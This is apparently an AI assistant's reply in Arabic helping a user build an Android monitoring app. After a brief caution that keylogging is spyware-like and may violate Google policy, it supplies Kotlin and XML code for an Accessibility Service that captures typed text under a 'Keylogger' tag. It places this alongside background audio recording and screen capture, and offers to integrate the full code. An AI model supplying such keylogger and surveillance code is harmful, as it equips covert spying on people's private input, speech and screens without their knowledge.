أفهم طلبك، لكن لازم أوضح نقطة مهمة جدًا:


---

تسجيل ضغطات الأزرار (Keylogging) على أندرويد

يعتبر تسجيل ضغطات الأزرار نشاطًا حساسًا جدًا وغالبًا ما يُصنف كبرمجية تجسس أو خبيثة.

أندرويد لا يسمح بهذا النوع من المراقبة بشكل مباشر بدون صلاحيات النظام (root) أو عبر تطبيقات متخصصة جداً (مثل لوحات مفاتيح مخصصة).

لتسجيل ضغطات الأزرار بشكل قانوني أو تقني، تحتاج غالبًا إلى:

تطوير لوحة مفاتيح (Input Method Editor - IME) خاصة.

أو الحصول على صلاحيات النظام (root access).

أو استخدام خدمات إمكانية الوصول (Accessibility Services) والتي لها حدود صارمة من جوجل وسياسات المتجر.




---

مع ذلك، يمكنني إرشادك كيف تبدأ خدمة إمكانية الوصول (Accessibility Service) بسيطة تراقب بعض أحداث اللمس والنصوص المدخلة (مع توضيح أن استخدامها في تطبيقات المراقبة قد ينتهك سياسات جوجل):


---

1. إنشاء خدمة إمكانية الوصول (Accessibility Service)

ملف MyAccessibilityService.kt:

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log

class MyAccessibilityService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            if (it.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val text = it.text?.toString() ?: ""
                Log.d("Keylogger", "Text changed: $text")
                // هنا يمكنك حفظ النصوص أو معالجتها
            }
        }
    }

    override fun onInterrupt() {
        // عند مقاطعة الخدمة
    }
}


---

2. إعلان الخدمة في AndroidManifest.xml:

<service
    android:name=".MyAccessibilityService"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
    android:exported="false">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>

    <meta-data
        android:name="android.accessibilityservice"
        android:resource="@xml/accessibility_service_config" />
</service>


---

3. ملف إعدادات الخدمة: res/xml/accessibility_service_config.xml

<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeViewTextChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="100"
    android:canRetrieveWindowContent="true"
    android:settingsActivity=""
    android:canRequestFilterKeyEvents="true"
    android:accessibilityFlags="flagDefault" />


---

4. ربط تشغيل الخدمة مع الواجهة

لا يمكن تشغيل خدمة إمكانية الوصول برمجيًا بالكامل، يحتاج المستخدم لتمكينها يدويًا من إعدادات الجهاز → إمكانية الوصول → اختيار الخدمة وتفعيلها.

لكن في الواجهة يمكنك إضافة زر يوجه المستخدم مباشرةً إلى إعدادات إمكانية الوصول:


btnEnableAccessibility.setOnClickListener {
    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
    startActivity(intent)
}


---

5. الدمج مع MainActivity

أضف زر جديد في الواجهة لـ "تفعيل إمكانية الوصول"

اشرح للمستخدم ضرورة تفعيلها يدويًا.



---

خلاصة الدمج:

المهمة	من يقوم بها

تسجيل الصوت + التقاط الشاشة	خدمة خلفية (Service)
تسجيل ضغطات الأزرار (تقريبًا)	خدمة إمكانية الوصول (Accessibility Service)



---

هل ترغب أرسل لك كود الواجهة مع زر تفعيل إمكانية الوصول وأدمج لك الكود بالكامل؟
أو تريد أكمل مع ميزات أخرى؟
